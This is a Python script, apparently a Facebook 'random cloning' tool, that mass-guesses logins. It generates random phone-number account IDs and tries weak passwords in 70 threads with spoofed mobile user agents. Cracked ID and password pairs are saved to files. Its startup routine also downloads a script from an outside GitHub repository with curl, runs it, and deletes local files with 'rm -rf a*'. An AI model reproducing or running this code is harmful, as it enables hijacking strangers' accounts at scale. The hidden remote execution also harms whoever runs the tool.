# coding=utf
import uuid
import os, sys, time, json, random, re, string, platform, base64

try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
P = '\x1b[1;97m'  # PUTIH
M = '\x1b[1;91m'  # MERAH
H = '\x1b[1;92m'  # HIJAU
K = '\x1b[1;93m'  # KUNING
B = '\x1b[1;94m'  # BIRU
U = '\x1b[1;95m'  # UNGU
O = '\x1b[1;96m'  # BIRU MUDA
N = '\x1b[0m'  # WARNA MATI
A = '\x1b[1;90m'  # WARNA ABU ABU
BN = '\x1b[1;107m'  # BELAKANG PUTIH
BBL = '\x1b[1;106m'  # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m'  # BELAKANG PINK
BB = '\x1b[1;104m'  # BELAKANG BIRU
BK = '\x1b[1;103m'  # BELAKANG KUNING
BH = '\x1b[1;102m'  # BELAKANG HIJAU
BM = '\x1b[1;101m'  # BELAJANG MERAH
BA = '\x1b[1;100m'  # BELAKANG ABU ABU
my_color = [
    P, M, H, K, B, U, O, N]
warna = random.choice(my_color)

ugen2 = []
ugen = []

for xd in range(5000):
    aa = 'Mozilla/5.0 (Linux; U; Android'
    b = random.choice(['3', '4', '5', '6', '7', '8', '9', '10', '11', '12', '13', '14', '15', '16', '17'])
    c = ' en-us; GT-'
    d = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    e = random.randrange(1, 999)
    f = random.choice(
        ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
         'W', 'X', 'Y', 'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = (f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)

sialxd = [
    "Dalvik/2.1.0 (Linux; U; Android 12.0.0; SM-G935U Build/hero2qlteue [FBAN/FB4A;FBAV/325.0.0.9214;FBBV/260762259;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/260762259;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/SM-G935U;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi"
    "Dalvik/2.1.0 (Linux; U; Android 12.0.0; N790 Build/deepblue [FBAN/FB4A;FBAV/346.0.0.31166;FBBV/386047872;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/386047872;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/N790;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi"
]
[
    'Dalvik/2.1.0 (Linux; U; Android 9.0.0; GT-I9195I Build/serranovelte [FBAN/FB4A;FBAV/490.0.0.12369;FBBV/758715415;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/758715415;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/GT-I9195I;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 13.0.0; TECNO-Y4 Build/TECNO-Y4 [FBAN/FB4A;FBAV/286.0.0.47424;FBBV/62960212;FBDM/{density=0.0,width=720,height=1280};FBLC/en_US;FBRV/62960212;FBMF/Tecno;FBBD/Tecno;FBPN/com.facebook.katana;FBDV/TECNO-Y4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 14.0.0; GT-S7508 Build/GT-S7508 [FBAN/FB4A;FBAV/205.0.0.39144;FBBV/950556240;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/950556240;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/GT-S7508;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 9.0.0; GT-I9018 Build/GT-I9018 [FBAN/FB4A;FBAV/334.0.0.14395;FBBV/745067528;FBDM/{density=0.0,width=720,height=1280};FBLC/en_US;FBRV/745067528;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/GT-I9018;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 5.0.0; ZTE T325 Build/ZTE_T325 [FBAN/FB4A;FBAV/377.0.0.48214;FBBV/55678121;FBDM/{density=0.0,width=720,height=1280};FBLC/en_US;FBRV/55678121;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.mlite;FBDV/ZTE T325;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 10.0.0; SM-T820 Build/gts3lwifi [FBAN/FB4A;FBAV/367.0.0.27418;FBBV/853015063;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/853015063;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-T820;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 7.0.0; SM-J120H Build/j1x3g [FBAN/FB4A;FBAV/147.0.0.47287;FBBV/968455697;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/968455697;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.mlite;FBDV/SM-J120H;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 14.0.0; ZTE BLADE A506 Build/P809T70 [FBAN/FB4A;FBAV/326.0.0.22213;FBBV/92604740;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/92604740;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.lite;FBDV/ZTE BLADE A506;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 11.0.0; 9002X Build/Pixi3-7_3G [FBAN/FB4A;FBAV/152.0.0.38467;FBBV/115887544;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/115887544;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.adsmanager;FBDV/9002X;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 14.0.0; GT-I5801 Build/GT-I5801 [FBAN/FB4A;FBAV/455.0.0.18354;FBBV/195930394;FBDM/{density=4.0,width=720,height=1280};FBLC/en_US;FBRV/195930394;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.orca;FBDV/GT-I5801;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 13.0.0; GT-P5100 Build/espresso10rf [FBAN/FB4A;FBAV/159.0.0.21169;FBBV/652072187;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/652072187;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.adsmanager;FBDV/GT-P5100;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 14.0.0; SM-G360V Build/coreprimeltevzw [FBAN/FB4A;FBAV/510.0.0.10392;FBBV/908016316;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/908016316;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.adsmanager;FBDV/SM-G360V;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 8.0.0; 6043D Build/DIABLOXPLUS [FBAN/FB4A;FBAV/362.0.0.39277;FBBV/780080475;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/780080475;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/6043D;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 6.0.0; Infinity_e2 Build/i6379 [FBAN/FB4A;FBAV/531.0.0.22405;FBBV/247021962;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/247021962;FBMF/Telenor;FBBD/Telenor;FBPN/com.facebook.lite;FBDV/Infinity_e2;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 10.0.0; 4036E Build/SOUL4 [FBAN/FB4A;FBAV/407.0.0.27554;FBBV/142512519;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/142512519;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.orca;FBDV/4036E;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 8.0.0; GT-S7390E Build/kylevess [FBAN/FB4A;FBAV/299.0.0.15264;FBBV/965102157;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/965102157;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.adsmanager;FBDV/GT-S7390E;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 12.0.0; 6050Y Build/EOS_lte [FBAN/FB4A;FBAV/446.0.0.46416;FBBV/785800165;FBDM/{density=3.0,width=720,height=1280};FBLC/en_US;FBRV/785800165;FBMF/TCT (Alcatel);FBBD/TCT (Alcatel);FBPN/com.facebook.adsmanager;FBDV/6050Y;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]',
    'Dalvik/2.1.0 (Linux; U; Android 8.0.0; Leopard MF800 Build/roamer2 [FBAN/FB4A;FBAV/521.0.0.3951'
    'Mozilla/5.0 (Linux; Android 10; itel P681L Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.85 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/346.0.0.8.76'
    'Mozilla/5.0 (Linux; Android 9; BV6900 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.48 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/348.0.0.8.103'
    'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X656 Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X656;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1']

logo = ("""
 \033[1;32m   d8888   .d8888b.   .d8888b.  
\033[1;34m   d8P888  d88P  Y88b d88P  Y88b 
\033[1;36m  d8P 888         888 888    888 
\033[1;33m d8P  888       .d88P 888    888 
\033[1;30md88   888   .od888P"  888    888 
\033[1;33m8888888888 d88P"      888    888 
\033[1;36m      888  888"       Y88b  d88P 
\033[1;31m      888  888888888   "Y8888P"    
 \033[1;32moooooooooooooooooooooooooooooooo                                                                                             
\33[1;37m----------------------------------------------
→   Owner      :  MR.DEVIL
→   Facebook   :  DEVIL
→   Github     :  PANGBAZ 
→   Tool Type  :  \033[1;30mRANDOM
\x1b[1;97m→   Version    :  1.1
\33[1;37m----------------------------------------------""")


def lines():
    print('\33[1;37m----------------------------------------------')


loop = 0
oks = []
cps = []
try:
    print('\n Updating...\n\033[1;37m Please Wait\033[0;97m\n Update don ')
    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
        os.system('python ali.py')
    else:
        pass
except:
    print('\n\033[1;31mNo internet connection ... \033[0;97m')


# global functions
def dynamic(text):
    titik = ['.   ', '..  ', '... ', '.... ']
    for o in titik:
        print('\r' + text + o),
        sys.stdout.flush();
        time.sleep(1)


def riaz():
    os.system('clear')
    print(logo)
    print('[1] Pak Random Cloning menu')
    print('[2] Bangladish Random Cloning')
    print('[3] JOIN FACEBOOK GROUP')
    print('[4] Follow me on Facebook')
    print('\x1b[1;91m[5] Exit Main menu')
    print('\33[1;37m----------------------------------------------')
    riaz1 = input('[•] Select option  : ')
    if riaz1 == '1':
        annu()
    if riaz1 == '5':
        riaz()
    if riaz1 == '3':
        os.system("xdg-open https://facebook.com/groups/1079392916067208/")
    if riaz1 == '4':
        os.system('xdg-open https://facebook.com/groups/1079392916067208/');
        riaz()
    if riaz1 == '2':
        bangla()
    else:
        print('\n\033[1;31mChoose valid option\033[0;97m')
        riaz()


def annu():
    os.system('clear')
    print(logo)
    print('[1] Random Method \x1b[1;92m1')
    print('\x1b[1;97m[2] Random Method \x1b[1;92m2')
    print('\x1b[1;97m[3] Random Method \x1b[1;92m3')
    print('\x1b[1;91m[4] Go to main menu')
    lines()
    riaz1 = input('[+] CHOOSE optION : ')
    if riaz1 == '1':
        m1()
    if riaz1 == '2':
        m2()
    if riaz1 == '3':
        m3()
    if riaz1 == '4':
        riaz()
    else:
        print('\n\033[1;37m[+] SELECT VALID optION\033[0;97m')
    #


def bangla():
    os.system('clear')
    print(logo)
    print('[1] Bngla Crack \x1b[1;92mM 1')
    print('\x1b[1;97m[1] Bngla Crack \x1b[1;92mM 1')
    print('\x1b[1;91m[3] Go to main menu')
    lines()
    riaz1 = input('[+] Select option : ')
    if riaz1 == '1':
        b1()
    if riaz1 == '2':
        b2()
    if riaz1 == '3':
        riaz()


# def choice()
#

def m1():
    user = []
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46 * '-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : ' + tl)
        print(' Selected Code :\x1b[1;92m ' + kode)
        print('\033[1;30m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [guru]
            yaari.submit(rcrack, uid, pwx, tl)
    print(46 * '-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46 * '-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');
    riaz()


#
def m2():
    user = []
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46 * '-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : ' + tl)
        print(' Selected Code :\x1b[1;92m ' + kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [guru, 'khankhan', 'khan12345', 'khan12']
            yaari.submit(rcrack, uid, pwx, tl)
    print(46 * '-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46 * '-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');
    riaz()


#
def m3():
    user = []
    os.system('clear')
    print(logo)
    print('[+] Example  : 92345,92318,92334,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46 * '-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : ' + tl)
        print(' Selected Code :\x1b[1;92m ' + kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [guru, 'khan786', 'khan1122', 'khan12', 'janjan']
            yaari.submit(rcrack, uid, pwx, tl)

    print(46 * '-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46 * '-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');
    riaz()


#
#
def b1():
    user = []
    os.system('clear')
    print(logo)
    print('[+] Example  : 88**,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46 * '-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : ' + tl)
        print(' Selected Code :\x1b[1;92m ' + kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [guru, kode]
            yaari.submit(rcrack, uid, pwx, tl)

    print(46 * '-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46 * '-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');
    riaz()


#
def b2():
    user = []
    os.system('clear')
    print(logo)
    print('[+] Example  : 88***,88***,88***,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Sim Code ')
    lines()
    kode = input('[+] Your Code : ')
    lines()
    os.system('clear')
    print(logo)
    print('[+] Example  : 1000,5000,100000,****Etc')
    print('\x1b[1;91m[+] See Note : Use Your Idz  Lemit ')
    lines()
    limit = int(input('[+] Idz Lemit : '))
    print(46 * '-')
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=70) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' Total Acounts : ' + tl)
        print(' Selected Code :\x1b[1;92m ' + kode)
        print('\x1b[1;91m If you no result use flight mode')
        lines()
        for guru in user:
            uid = kode + guru
            pwx = [guru, 'freefire', 'bangladish', 'free fire']
            yaari.submit(rcrack, uid, pwx, tl)
    print(46 * '-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46 * '-')
    print('The Process Has Been Complete')
    print('Press Enter to Back');
    riaz()


#
def rcrack(uid, pwx, tl):
    # print(user)
    global loop
    global cps
    global oks
    global proxy

    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
                "m_ts": re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
                "li": re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
                "try_number": "0",
                "unrecognized_tries": "0",
                "email": uid,
                "pass": ps,
                "login": "Log In"}
            header_freefb = {'authority': 'x.facebook.com',
                             'method': 'GET',
                             'scheme': 'https',
                             'accept': '*/*',
                             'accept-language': 'en-US,en;q=0.9',
                             'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryqIcgpjmvOOm7VL3j',
                             # 'cookie': 'datr=NsVZZAefHTCn1iL6nbS7tJQx; sb=NsVZZO8ScG-R_58VtztEFSls; m_pixel_ratio=2; dnonce=AWkWImcFoKGGYP3EPIfCibdkiA3xzV2kwhaT9yb8oVP6aYCG1siV7leEjfH9NkM5BDNUHt5h5Y4w25OpA7qfO8ot; wd=360x666; fr=0rGdoPkboKxZTKkUE..BkWcU2.VM.AAA.0.0.BkWcVy.AWWpiVk7C0Q',
                             'origin': 'https://x.facebook.com',
                             'referer': 'https://x.facebook.com/',
                             'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                             'sec-ch-ua-mobile': '?1',
                             'sec-ch-ua-platform': '"Android"',
                             'sec-fetch-dest': 'empty',
                             'sec-fetch-mode': 'cors',
                             'sec-fetch-site': 'same-origin',
                             'x-asbd-id': '198387',
                             'x-fb-lsd': 'AVraOg5D4M8',
                             'x_fb_background_state': '1',
                             'user-agent': pro}
            lo = session.post('https://x.facebook.com//login/device-based/regular/login/?refsrc', data=log_data,
                              headers=header_freefb).text
            log_cookies = session.cookies.get_dict().keys()
            # print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                uid = coki[151:166]
                print('\033[1;32m[DEVIL-OK] ' + uid + '|' + ps + '\033[0;97m')
                open('/sdcard/DEVIL-OK.txt', 'a').write(uid + ' | ' + ps + '\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki = ";".join([key + "=" + value for key, value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;30m[DEVIL-CP] ' + uid + ' | ' + ps + '\x1b[1;97m')
                open('/sdcard/DEVIL-CP.txt', 'a').write(uid + ' | ' + ps + '\n')
                cps.append(uid)
                break
            else:
                continue
        loop += 1
        sys.stdout.write(f'\r[\033[1;97mMR.DEVIL\033[1;97m] %s|\033[1;33mOK:- %s \r' % (loop, len(oks))),
        sys.stdout.flush()
    except:
        pass


riaz()